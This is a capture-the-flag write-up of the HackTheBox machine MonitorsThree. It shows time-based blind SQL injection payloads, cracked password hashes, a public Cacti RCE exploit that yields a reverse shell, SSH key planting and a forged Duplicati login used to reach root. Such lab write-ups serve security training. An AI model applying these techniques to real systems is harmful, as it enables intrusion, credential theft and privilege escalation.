---
title: MonitorsThree
tags:
  - HackTheBox
  - Medium
  - Linux
  - SQLi
  - Cacti
  - CVE
  - Brute-Forcing
  - Duplicati
date: 2024-07-05T00:00:00Z
---
![](Pasted%20image%2020240904220155.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.30 monitorsthree.htb" | sudo tee -a /etc/hosts
```

First I performed a Nmap scan:

```shell
nmap -sC -T4 -p- monitorsthree.htb > sC.txt

[redacted]
PORT     STATE    SERVICE
22/tcp   open     ssh
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http
|_http-title: MonitorsThree - Networking Solutions
8084/tcp filtered websnp
```

I decided to take a look at the webpage:

![](Pasted%20image%2020240904221116.png)

After inspecting the source code, I didn't find anything, so I took a look at the login page:

![](Pasted%20image%2020240904221352.png)

Let's capture the request to `admin:admin` and pass it to [Sqlmap 🪲](/notes/tools/Sqlmap.md):

```shell
sqlmap -r req.txt -p ' username' --level=5 --risk=3 --batch --dbs
```

Unfortunately, it didn't work. So let's try the same at the `forgot_password.php`:

![](Pasted%20image%2020240904223927.png)

```shell
sqlmap -r req.txt --level=5 --risk=3 --batch --dbs --dump

[redacted]
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2253 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: username=a';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=a' AND (SELECT 2135 FROM (SELECT(SLEEP(5)))iKyK)-- IvUB
```

> *Bingo!*

It seems that the account recovery page is vulnerable to **time-base blind sql injection**:

```shell
[redacted]

available databases [2]:
[*] `monitorsthree_d\x81`
[*] information_schema
```

So I inspected `monitorsthree_db`:

```shell
sqlmap -r req.txt --level=5 --risk=3 --batch -D monitorsthree_db --tables --dump

[redacted]
Database: monitorsthree_db
[6 tables]
+---------------+
| uers         |
| changelog     |
| customers     |
| invoice_tasks |
| invoices      |
| tasks         |
+---------------+
```

Let's check `users`:

```shell
sqlmap -r req.txt --level=5 --risk=3 --batch -D monitorsthree_db -T users -C username,password --dump --threads=10 --time-sec=1

[redacted]
Database: monitorsthree_db
Table: users
[4 entries]
+-----------+----------------------------------+
| username  | password                         |
+-----------+----------------------------------+
| janderson | 1e68b6eb86b45f6d92f8f292428f77ac |
| admin     | 31a181c8372e3afc59dab863430610e8 |
| dthompson | 633b683cc128fe244b00f176c8a950f5 |
| mwatson   | c585d01f2eb3e6e1073e92023088a3dd |
+-----------+----------------------------------+
```

> *It took a freaking year to finish `-_-`*

Now it's time to crack the passwords. I'll use [Crackstation](https://crackstation.net/):

```shell
31a181c8372e3afc59dab863430610e8	md5	greencacti2001
```

So now we've got `admin:greencacti2001`. We can login inside the application:

![](Pasted%20image%2020240905151709.png)

After some inspection, I didn't find an entry point. So I decided to take a step back and perform a subdomain enumeration with [Ffuf 🐳](/notes/tools/Ffuf.md):

```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://monitorsthree.htb:80/ -H 'Host: FUZZ.monitorsthree.htb' -fs 13560

[redacted]
cacti   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 44ms]
```

So I added to my known hosts and search it:

![](Pasted%20image%2020240905152214.png)

I tried the credentials I obtained before:

![](Pasted%20image%2020240905152253.png)

> I'm in!

## Weaponization

I searched for "**cacti 1.2.26 cve**" and found [CVE-2024-25641-CACTI-RCE-1.2.26](https://github.com/5ma1l/CVE-2024-25641), an authenticated RCE.

## Exploitation

```shell
python3 exploit.py http://cacti.monitorsthree.htb/cacti admin greencacti2001 -p ../../shell.php 

Created by: 5ma1l
        Automate the process of exploiting the CVE-2024-25641


[*] Login attempts...
[SUCCESS]
[*] Creating the gzip...
[SUCCESS]
GZIP path is /home/gitblanc/HackTheBox/MonitorsThree/CVE-2024-25641-CACTI-RCE-1.2.26/CVE-2024-25641/lzudalzsajekuhei.php.gz
[*] Sending payload...
[SUCCESS]
You will find the payload in http://cacti.monitorsthree.htb/cacti/resource/lzudalzsajekuhei.php
Do you wanna start the payload ?[Y/n]Y
Payload is running...
```

> We've got a reverse shell :D

![](Pasted%20image%2020240905154747.png)

Stabilize it:

```shell
python3 -c "import pty; pty.spawn('/bin/bash')"
# then
export TERM=xterm
# Press -> Ctrl + Z
stty raw -echo; fg
```

![](Pasted%20image%2020240905154920.png)

Unfortunately, we've got no read permissions inside marcus directory, so let's run linpeas:

![](Pasted%20image%2020240905155728.png)

We've got a user to access the local database `catiuser:cactiuser`:

```shell
mysql -u cactiuser -h localhost -p

[redacted]
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
| mysql              |
+--------------------+

[redacted]
use cacti;
show tables;

[redacted]
| user_auth                           |
```

```shell
select username,password from user_auth;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |
| guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |
| marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |
+----------+--------------------------------------------------------------+
```

Let's try to crack marcus password hash (it seems to be bcrypt):

```shell
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
[redacted]
12345678910
```

> We can now login as marcus and get user flag:

![](Pasted%20image%2020240905160532.png)

## Privilege Escalation

I'll run linpeas again (alternative with `ss- tlnp`):

![](Pasted%20image%2020240905161109.png)

What is behind port 8200? I decided to forward that port traffic to my machine:
- Check [Tunneling 🚡](/notes/tunneling.md)

```shell
ssh -L 8200:localhost:8200 marcus@monitorsthree.htb
```

I got this error: `marcus@monitorsthree.htb: Permission denied (publickey).`, so I generated a public key:

```shell
ssh-keygen -t rsa -b 4096 -C "gitblanc@gitblanc.com"
# paste the id_rsa.pub on the ~/.ssh/authorized_keys remote machine 
ssh -L 8200:localhost:8200 marcus@monitorsthree.htb -i id_rsa -N -f
```

The `-N` and `-f` are to not generate a ssh session. Now just search for it:

![](Pasted%20image%2020240905162649.png)

Let's search for "**Duplicati login bypass**": [Medium article](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee)

1. I downloaded the Duplicati configuration to my machine:
2. I downloaded sqlitebrowser
3. I opened the configuration: `sqlitebrowser Duplicati-server.sqlite`
4. I checked the `Option >> Data`:

![](Pasted%20image%2020240905163802.png)

I converted it from base 64 to hex:

![](Pasted%20image%2020240905170153.png)

Then I crafted this in the browser console:

```shell
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('DQT316dIQrcSpT2WWxvnN/CFFRkFh+Cq6AdjPVk3Z0E=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64);

noncedpwd
```

And I forwarded it as url encoded password:

![](Pasted%20image%2020240905170112.png)

As Duplicati is a backup web app run by root, wee can create a backup of our ssh public key and then restore that backup into `/root/.ssh`.

![](Pasted%20image%2020240905170555.png)

![](Pasted%20image%2020240905171005.png)

![](Pasted%20image%2020240905170953.png)

Click on Run Now:

![](Pasted%20image%2020240905171241.png)

Then click on Restore and you can now login as root. 

> We are root now and got root flag :D

==Machine pwned==